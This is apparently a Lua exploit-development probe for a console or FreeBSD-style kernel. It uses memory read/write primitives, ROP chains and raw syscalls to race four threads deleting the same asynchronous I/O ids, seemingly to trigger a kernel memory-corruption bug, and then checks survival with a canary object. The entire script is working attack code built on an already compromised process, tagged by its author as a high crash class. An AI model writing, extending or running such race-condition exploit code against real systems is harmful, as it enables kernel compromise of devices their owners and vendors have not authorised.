-- CRASH_CLASS: HIGH
-- PROBE 640a: four barrier-released chains deleting the same 8 ids
print("=== PROBE 640a: AIO RACE, FOUR THREADS ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local NT=4
local NIDS=8
local data=memory.alloc(0x1000) local out=memory.alloc(0x40)
for i=0,0xFFC,4 do wd(N(data)+i,0) end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662) local sc454=mk(454)
wd(N(out),0)
local o,r=pcall(function() return sc669(uint64(0x1001),uint64(N(data)),uint64(NIDS),uint64(1),uint64(N(out))) end)
local base=rd(N(out))
print(string.format("[A] create ret=%d base=%s",o and N(r) or -99,tostring(base)))
if not o or N(r)~=0 or not base or base<=0 then print("[!] no object"); return end
local ids=memory.alloc(NIDS*4)
for i=0,NIDS-1 do wd(N(ids)+i*4, base + i*0x10000) end
local chk=memory.alloc(0x40)
local good=0
for i=0,NIDS-1 do
    wd(N(chk),0x77777777)
    pcall(function() sc664(U(N(ids)+i*4),uint64(1),uint64(N(chk))) end)
    local st=rd(N(chk))
    if st==3 or st==0x10003 then good=good+1 end
end
print(string.format("[B] polled=%d/%d",good,NIDS))
if good<NIDS then print("[!] not ready"); return end
local W=memory.alloc(8)
wq(N(W),uint64(0))
local st={}
for t=1,NT do
    st[t]=memory.alloc(NIDS*4)
    for i=0,NIDS*4-1,4 do wd(N(st[t])+i,0x77777777) end
end
local chains={}
for t=1,NT do
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x10000})
    c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
    for i=0,NIDS-1 do
        c:push_syscall_with_ret(mk(662), U(N(ids)+i*4), uint64(1), U(N(st[t])+i*4))
    end
    chains[t]=c
end
print("[C] chains built")
local th={}
for t=1,NT do th[t]=thread:new(chains[t]) end
for t=1,NT do th[t]:run(true) end
for i=1,600000 do local x=i end
wq(N(W),uint64(1))
local ow,rw=pcall(function() return sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print(string.format("[D] wake rv=%s",tostring(ow and rw or "err")))
for t=1,NT do th[t]:join() end
print("[E] joined")
local allzero=0
local per={}
for i=0,NIDS-1 do
    local cnt=0
    for t=1,NT do
        if rd(N(st[t])+i*4)==0 then cnt=cnt+1 end
    end
    if cnt>0 then per[#per+1]=string.format("%d:%d",i,cnt) end
    if cnt==NT then allzero=allzero+1 end
end
print(string.format("[F] ids with >=2 zeros=%d all-zero=%d",#per,allzero))
print("[G] "..table.concat(per," "))
-- canary: a fresh object must poll and delete cleanly
wd(N(out),0)
local o2,r2=pcall(function() return sc669(uint64(1),uint64(N(data)),uint64(1),uint64(1),uint64(N(out))) end)
local b2=rd(N(out))
local ok2=true
if not o2 or N(r2)~=0 then ok2=false end
if ok2 and b2 and b2>0 then
    wd(N(chk),0x77777777) wd(N(ids),b2)
    pcall(function() sc664(U(N(ids)),uint64(1),uint64(N(chk))) end)
    local s2=rd(N(chk))
    wd(N(chk),0x77777777)
    pcall(function() sc662(U(N(ids)),uint64(1),uint64(N(chk))) end)
    local s3=rd(N(chk))
    print(string.format("[H] canary poll=%s del=%s",tostring(s2),tostring(s3)))
    if not (s2==3 or s2==0x10003) or s3~=0 then ok2=false end
else ok2=false end
print(string.format("[I] canary ok=%s alive=%d",tostring(ok2),N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] alive")
